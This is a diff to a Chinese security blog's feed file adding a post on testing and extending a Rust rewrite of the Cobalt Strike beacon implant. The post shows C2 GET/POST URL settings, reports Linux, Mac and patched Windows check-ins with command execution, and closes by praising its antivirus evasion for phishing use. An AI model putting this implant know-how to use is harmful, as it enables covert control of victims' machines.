@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>cobaltstrike-beacon-rust测试与修改</title>
+      <link href="/posts/19d1f7ce/"/>
+      <url>/posts/19d1f7ce/</url>
+      
+        <content type="html"><![CDATA[<p>github 看到大佬 star 了一个rust项目<a href="https://github.com/b1tg/cobaltstrike-beacon-rust/">cobaltstrike-beacon-rust</a>，该项目是直接使用 rust 编写了 cs 的 beacon。</p><h1 id="获取-C2-信息"><a href="#获取-C2-信息" class="headerlink" title="获取 C2  信息"></a>获取 C2  信息</h1><p>这里为了方便直接使用默认的 cs 进行测试，如果使用自己修改过的 cs 可根据相关资料或者配置文件获得基本的 CS信息。<br><img src="https://s2.loli.net/2023/05/12/wU8kvpWuxDAz9Vb.png" alt="image.png"><br>作者这里已经在<code>generate_config.py</code>文件种写好了默认的信息，只需要将<code>BEACON_KEYS_PATH</code>设置一下就好，默认在 cs 目录下。<br><img src="https://s2.loli.net/2023/05/12/tCRZYIcvD27sxg4.png" alt="image.png"></p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>直接使用作者脚本内的默认信息，将 ip 修改成 cs 的就好</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C2_GET_URL = <span class="string">&quot;http://192.168.1.106:8080/fwlink&quot;</span></span><br><span class="line">C2_POST_URL = <span class="string">&quot;http://192.168.1.106:8080/submit.php?id=&quot;</span></span><br><span class="line">USER_AGENT = <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; Avant Browser)&quot;</span></span><br><span class="line">BEACON_KEYS_PATH = <span class="string">&quot;.cobaltstrike.beacon_keys&quot;</span></span><br></pre></td></tr></table></figure><p>运行直接上线，不用再借助插件之类的<br><img src="https://s2.loli.net/2023/05/12/YHrJmMOsIW3a7bo.png" alt="image.png"><br>尝试执行命令，成功返回<br><img src="https://s2.loli.net/2023/05/12/gB52Fceb7KjYNyM.png" alt="image.png"><br>运行会看到详细信息。<br><img src="https://s2.loli.net/2023/05/12/r3ntXxag8iJz6F5.png" alt="image.png"></p><h1 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h1><p>重复上面操作，直接运行，mac 直接上线<br><img src="https://s2.loli.net/2023/05/12/lyRaqK1B2XU3iHv.png" alt="image.png"></p><p>和 linux一样只有执行命令的功能<br><img src="https://s2.loli.net/2023/05/12/OjonqTIWESCUazH.png" alt="image.png"></p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>这里在 win10 上运行测试失败，报错如下<br><img src="https://s2.loli.net/2023/05/12/Q1RbSoZjDXIuHOJ.png" alt="image.png"><br>查看一下代码，作者目前只是对Linux 和 Unix 情况做了判断，对 Windows 还没有<br><img src="https://s2.loli.net/2023/05/12/ksWTyPQoG5wANfM.png" alt="image.png"></p><p>这边我自己对代码进行了修改，实现 Windows 上线的功能，至此全平台上线实现。<br><img src="https://s2.loli.net/2023/05/12/9tiLF4yU7E6zTkZ.png" alt="image.png"><br>由于是虚拟机内网 ip 获取还有些问题，有待改进。<br><img src="https://s2.loli.net/2023/05/12/Ah9JwulTQ1gjMne.png" alt="image.png"><br>修改后的项目地址：</p><ul><li><a href="https://github.com/808Mak1r/cobaltstrike-beacon-rust">https://github.com/808Mak1r/cobaltstrike-beacon-rust</a></li></ul><p>已经提交 <a href="https://github.com/b1tg/cobaltstrike-beacon-rust/pull/3">PR</a> 等待作者合并。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该项目研究意义还是很大的，继续完善可以实现全平台的直接上线，而且是直接使用 rust 编写的对于免杀效果应该也是非常好的。<br>对于钓鱼场景还是可以考虑使用，就是 mac 可能麻烦点应该还是得制作 DMG、PKG等安装包。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 后渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 后渗透 </tag>
+            
+            <tag> 持久化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>K8S API访问控制之RBAC利用</title>
       <link href="/posts/836b7920/"/>
       <url>/posts/836b7920/</url>
@@ -94,11 +121,11 @@
             
             <tag> 云原生 </tag>
             
-            <tag> 横向 </tag>
-            
             <tag> 后渗透 </tag>
             
             <tag> 持久化 </tag>
+            
+            <tag> 横向 </tag>
             
         </tags>
       
